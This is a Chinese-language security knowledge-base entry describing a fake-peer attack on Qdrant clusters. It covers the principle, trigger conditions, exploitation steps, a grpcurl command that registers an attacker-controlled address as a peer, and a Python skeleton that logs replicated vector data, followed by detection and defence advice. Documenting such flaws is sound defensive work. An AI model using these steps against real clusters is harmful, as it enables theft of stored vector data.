---
id: ai-security-rag-security-qdrant-fake-peer-vector-exfil
title: 伪造 Qdrant peer 接收分片复制窃取向量数据
type: scenario
domain: ai-security
path: ai-security/rag-security
technique: fake-peer-vector-exfil
aliases:
- Qdrant 假节点
- 伪 peer 窃取向量
- 分片复制窃取
- 向量数据泄露
- fake 6335
tags:
- qdrant
- vector-database
- rag
- grpc
- raft
- data-exfiltration
- cluster
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: 'GHSA-3gph-6c29-p29v: 1.18.0–1.19.1（1.19.2 修复）；GHSA-frc7-44gm-99qq: 1.20.0 以前（1.20.0 修复）；1.20.0 无 api_key 时内部端口仍无认证'
verification:
  verified_by: verifier-C
  verified_at: '2026-11-04T19:20:43+08:00'
  notes: 已对照原文与9张内联图核对：伪节点注册为 peer 100、集群持续发送 Raft 消息、副本数 2 的 collection 写入后假服务收到 77 字节 PointsInternal/Upsert 及向量分量 [0.1,0.2,0.3,0.4] 均一致，数据外带链已实证；约两百行 Python 假服务原文未公开全文，未复跑。版本按原文写入
---

## 一句话结论

攻击者用 `AddPeerToKnown` 把一个自己控制的假 6335 服务注册成 Qdrant 集群成员后，集群会把它当正常节点，持续发送 Raft 消息并按副本策略复制分片；假服务只需实现最小 gRPC 接口并返回成功，就能在 `PointsInternal/Upsert` 等请求中收到真实向量数据。

## 原理

Qdrant 分布式集群通过 Raft 维护成员列表。`AddPeerToKnown` 只记录 peer 的 URI、端口和 id，不校验该地址是否真的运行 Qdrant，也不验证连通性——“先记住，稍后再连”。

新 peer 被接受后：

- 集群按成员地址持续发送 Raft 消息；
- 创建多副本 collection 或触发分片重平衡时，leader 会把分片复制到新成员；
- 分片复制与点写入通过内部 gRPC 的 `PointsInternal/Upsert`、`WaitOnConsensusCommit` 等方法传输，请求中带有 collection 名、点 id 和向量分量；
- 假服务只要按 proto 返回合法响应（Acknowledged/空响应），集群就认为复制成功，继续发送。

因此攻击者不需要破解数据格式或拿到存储文件，只需在成员地址上“接住”集群主动推来的流量。

## 触发条件

- 目标 Qdrant 为分布式集群，且攻击者能通过认证缺口调用 `Raft/AddPeerToKnown`（只读 key、未开 enforce、或无 api_key 的匿名访问）；
- 攻击者控制的地址能被集群节点访问（同网段/同 VPC/K8s 网络）；
- 假服务监听在声明的 6335 端口，并实现 Qdrant 内部 gRPC 的最小方法集；
- 集群存在多副本 collection 或会发生分片重平衡；
- 集群把新 peer 视为健康成员（假服务返回正常响应）。

## 利用步骤

1. 在攻击者主机启动假 6335 gRPC 服务，加载 Qdrant 的 `points_internal_service.proto` 等文件；
2. 实现 `PointsInternal/Upsert`、`WaitOnConsensusCommit` 等方法，记录请求并返回成功；
3. 通过认证缺口调用 `AddPeerToKnown`，uri 指向攻击者地址，id 选一个不与现有 peer 冲突的 uint64；
4. 等待集群发送 Raft/心跳；观察假服务日志出现内部请求；
5. 在目标创建副本数为 2 的 collection，写入测试点，触发向新 peer 的分片复制；
6. 从 `PointsInternal/Upsert` 请求中提取 collection 名、点 id 与向量分量；
7. 持续监听或触发重平衡，收集更多分片数据。

## PoC

注册伪节点（需先满足认证缺口）：

```bash
grpcurl -plaintext -import-path ./proto -proto raft_service.proto \
  -H "api-key: ro-key-123" \
  -d '{"uri":"http://172.31.0.1:6335","port":6335,"id":100}' \
  172.31.0.2:6335 qdrant.Raft/AddPeerToKnown
```

假服务的核心是“接住并记录”，不是完整实现 Qdrant。文章实测的假服务约两百行 Python，仅回空响应、不解析 protobuf，即可在日志中看到：

```plain
[数据] PointsInternal/Upsert 第 1 次：请求 77 字节，匹配到写入过的向量分量 [0.1, 0.2, 0.3, 0.4]
```

最小实现要点（伪代码，需用 proto 生成服务基类）：

```python
class PointsInternalServicer(points_internal_service_pb2_grpc.PointsInternalServicer):
    def Upsert(self, request, context):
        log(request.SerializeToString())      # 记录原始字节，后续离线解析
        return points_internal_service_pb2.PointsOperationResponse(result=...)

# 用 grpc.server + add_PointsInternalServicer_to_server 监听 6335
```

## 变体与关联

- 变体：伪造节点后不实现数据面，只实现 Raft 响应以长期潜伏；利用快照接口拉取更大分片；结合 `GetTelemetry` 收集集群信息。
- 关联：[[web-generic-auth-qdrant-internal-grpc-auth-bypass]]（注册伪节点所需的认证缺陷）；RAG 向量库数据泄露与检索投毒。
- 不确定点：分片复制触发条件与副本策略、collection 配置有关；不同 Qdrant 版本的内部 proto 方法名可能变化，需以目标版本 proto 为准。

## 检测与防御

- 检测：`/cluster` 的 peers 中出现未知 id/URI；节点日志出现向陌生地址发送 Raft 消息或 `message_send_failures`；Qdrant 节点对非集群地址发起 6335 连接；collection 副本状态异常。
- 防御：修复内部端口认证缺口（升级、配置 api_key、开启 TLS）；网络策略限制 6335 仅集群节点可达；对集群成员变更告警并审计 `AddPeerToKnown` 调用；限制节点出网。
- 数据面：对向量库中的敏感数据做访问控制与加密；定期核对 peer 列表与预期拓扑；假节点即使只回空响应也能收到数据，因此“返回成功”不能作为成员可信的判据。
